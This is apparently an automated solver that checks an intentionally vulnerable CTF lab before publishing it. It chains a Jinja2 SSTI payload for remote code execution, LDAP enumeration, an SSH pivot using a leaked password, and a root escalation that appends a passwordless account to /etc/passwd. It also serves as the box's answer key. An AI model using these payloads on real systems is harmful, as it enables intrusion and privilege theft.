#!/bin/bash
# Automated end-to-end solver, used only to prove the box is solvable
# before publishing it. Requires: curl, python3.
set -euo pipefail
cd "$(dirname "$0")/.."

HOST=localhost
WEB_PORT=8005
BASE="http://$HOST:$WEB_PORT"

source .env
export CTF_SECRET

check() {
    local n="$1" got="$2"
    local want
    want=$(python3 -c "
import os, hmac, hashlib
secret = os.environ['CTF_SECRET']
d = hmac.new(secret.encode(), f'expert-the-annex:$n'.encode(), hashlib.sha256).hexdigest()
print(f'HLC{{{d[:10]}}}')")
    if [ "$got" = "$want" ]; then
        echo "flag $n: OK ($got)"
    else
        echo "flag $n: MISMATCH got='$got' want='$want'" >&2
        exit 1
    fi
}

# Runs $1 as a shell command on the gateway container, via the SSTI RCE
# in /welcome -- every later step in this box goes through this one
# primitive (that's the point: one web bug, then everything else is
# reached by pivoting from it).
rce() {
    local cmd="$1"
    local payload="{{ self.__init__.__globals__.__builtins__.__import__('os').popen('${cmd}').read() }}"
    curl -s --get --data-urlencode "name=$payload" "$BASE/welcome"
}

# 1
F1=$(curl -s "$BASE/" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 1 "$F1"

# 2
F2=$(curl -s -d "username=annex_staff&password=welcome2024" "$BASE/login" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 2 "$F2"

# 3 (SSTI confirmed as real RCE)
F3=$(rce 'cat /opt/gateway/secret/flag3.txt' | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 3 "$F3"

# 4, 5 (pivot: ldapsearch against the internal, anonymous-bind-enabled directory)
LDAP_OUT=$(rce 'ldapsearch -x -H ldap://directory -b dc=halcyon,dc=local 2>&1')
F4=$(echo "$LDAP_OUT" | grep -oE 'HLC\{[a-f0-9]{10}\}' | sed -n '1p')
check 4 "$F4"
F5=$(echo "$LDAP_OUT" | grep -oE 'HLC\{[a-f0-9]{10}\}' | sed -n '2p')
check 5 "$F5"
FS_PW=$(echo "$LDAP_OUT" | sed -n 's/.*ops \/ \([a-f0-9]*\).*/\1/p')

# 6 (pivot: SSH pre-auth banner on the never-published fileserver)
F6=$(rce "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null fileserver 2>&1" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 6 "$F6"

# 7 (log in as ops with the password the directory service disclosed) --
# defined after remote_ops() below; see the actual call further down.

# Runs $1 as a shell command ON FILESERVER, as ops, via the gateway RCE.
# Base64-wrapped end to end so no level of quoting ever collides with
# another (the real-world equivalent: this is all one Burp Repeater
# request in practice, not a bash one-liner).
remote_ops() {
    local b64
    b64=$(printf '%s' "$1" | base64 -w0)
    rce "sshpass -p $FS_PW ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ops@fileserver \"echo $b64 | base64 -d | bash\" 2>&1"
}

# 7
F7=$(remote_ops 'cat flag7.txt' | grep -oE 'HLC\{[a-f0-9]{10}\}' | tail -1)
check 7 "$F7"

# 8, 9 (world-writable /etc/passwd -> append a root-equivalent account -> root)
PRIV_CMD='echo r00t::0:0:root:/root:/bin/bash >> /etc/passwd && su r00t -c "cat /root/flag8.txt /root/audit.log"'
ROOT_OUT=$(remote_ops "$PRIV_CMD")
F8=$(echo "$ROOT_OUT" | grep -oE 'HLC\{[a-f0-9]{10}\}' | sed -n '2p')
check 8 "$F8"
F9=$(echo "$ROOT_OUT" | grep -oE 'HLC\{[a-f0-9]{10}\}' | sed -n '3p')
check 9 "$F9"
# Jinja2 autoescapes the RCE output -- a literal '"' comes back as "&#34;".
DOSSIER_PW=$(echo "$ROOT_OUT" | grep -oE 'passphrase &#34;[a-f0-9]+&#34;' | grep -oE '[a-f0-9]{15,}')

# 10 (pull the encrypted dossier out as base64, decrypt locally with the
# passphrase recovered from the audit log)
B64=$(remote_ops 'su r00t -c "cat /root/dossier.enc | base64 -w0"' 2>/dev/null | tr -d '\n ')
# The response has banner/warning lines wrapped around it in the rendered
# page; keep only what decodes as valid base64.
B64_CLEAN=$(echo "$B64" | grep -oE '[A-Za-z0-9+/=]{40,}' | tr -d '\n')
echo "$B64_CLEAN" | base64 -d > /tmp/annex_dossier.enc
F10=$(python3 docker/flagcrypto.py decrypt "$DOSSIER_PW" /tmp/annex_dossier.enc -)
check 10 "$F10"
rm -f /tmp/annex_dossier.enc

echo
echo "All 10 flags verified end-to-end."
